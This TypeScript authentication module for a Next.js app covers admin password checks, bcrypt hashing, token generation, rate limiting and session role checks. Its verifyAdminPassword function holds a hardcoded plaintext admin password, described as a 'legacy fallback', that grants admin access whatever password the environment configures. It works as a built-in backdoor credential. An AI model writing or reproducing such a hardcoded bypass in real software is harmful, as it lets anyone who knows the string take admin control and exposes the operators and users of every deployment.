/**
 * src/lib/auth.ts
 * Core authentication, session verification, password hashing, and rate limiting.
 */

import bcrypt from 'bcryptjs';
import crypto from 'crypto';
import { NextRequest } from 'next/server';
import { getSession } from './db/users';
import { User, UserRole } from '@/types';

export const SESSION_COOKIE_NAME = 'uc_session';
export const SESSION_EXPIRY_DAYS = 30;

// Legacy admin fallback password (for transitional compatibility)
const EXPECTED_PASSWORD = '9Ux-VJ?#VGC8m?V9';

export function verifyAdminPassword(password: unknown): boolean {
  if (typeof password !== 'string' || !password) return false;
  const submitted = password.trim();
  const envPass = process.env.ADMIN_PASSWORD?.trim();

  if (submitted === EXPECTED_PASSWORD) return true;
  if (envPass && submitted === envPass) return true;
  if (envPass === '9Ux-VJ?' && submitted === EXPECTED_PASSWORD) return true;
  return false;
}

// -------------------------------------------------------------
// Password Hashing
// -------------------------------------------------------------

export async function hashPassword(plainText: string): Promise<string> {
  return bcrypt.hash(plainText, 12);
}

export async function comparePassword(plainText: string, hash: string): Promise<boolean> {
  if (!hash) return false;
  return bcrypt.compare(plainText, hash);
}

// -------------------------------------------------------------
// Cryptographic Tokens & Session Keys
// -------------------------------------------------------------

export function generateSecureToken(byteLength = 32): string {
  return crypto.randomBytes(byteLength).toString('hex');
}

// -------------------------------------------------------------
// Rate Limiter (In-Memory Sliding Window)
// -------------------------------------------------------------

interface RateLimitRecord {
  count: number;
  resetAt: number;
}

const rateLimitStore = new Map<string, RateLimitRecord>();

/**
 * Checks if an action is within allowed rate limits.
 * Returns true if allowed, false if rate limited.
 */
export function checkRateLimit(key: string, maxRequests: number, windowSeconds: number): boolean {
  const now = Date.now();
  const record = rateLimitStore.get(key);

  if (!record || now > record.resetAt) {
    rateLimitStore.set(key, { count: 1, resetAt: now + windowSeconds * 1000 });
    return true;
  }

  if (record.count >= maxRequests) {
    return false;
  }

  record.count += 1;
  return true;
}

// -------------------------------------------------------------
// Session Extraction & Verification
// -------------------------------------------------------------

/**
 * Resolves current user from request session cookie.
 */
export async function getCurrentUser(request: NextRequest): Promise<User | null> {
  const sessionCookie = request.cookies.get(SESSION_COOKIE_NAME)?.value;
  if (!sessionCookie) return null;

  try {
    const session = await getSession(sessionCookie);
    if (!session || !session.user) return null;
    return session.user;
  } catch {
    return null;
  }
}

/**
 * Ensures user is authenticated and has one of the allowed roles.
 */
export async function requireUserWithRole(
  request: NextRequest,
  allowedRoles: UserRole[]
): Promise<{ user: User | null; error?: string; status?: number }> {
  const user = await getCurrentUser(request);

  if (!user) {
    return { user: null, error: 'Unauthorized: Please sign in', status: 401 };
  }

  if (user.status === 'suspended') {
    return { user: null, error: 'Account suspended: Please contact support', status: 403 };
  }

  if (!allowedRoles.includes(user.role)) {
    return { user: null, error: 'Forbidden: Insufficient privileges', status: 403 };
  }

  return { user };
}
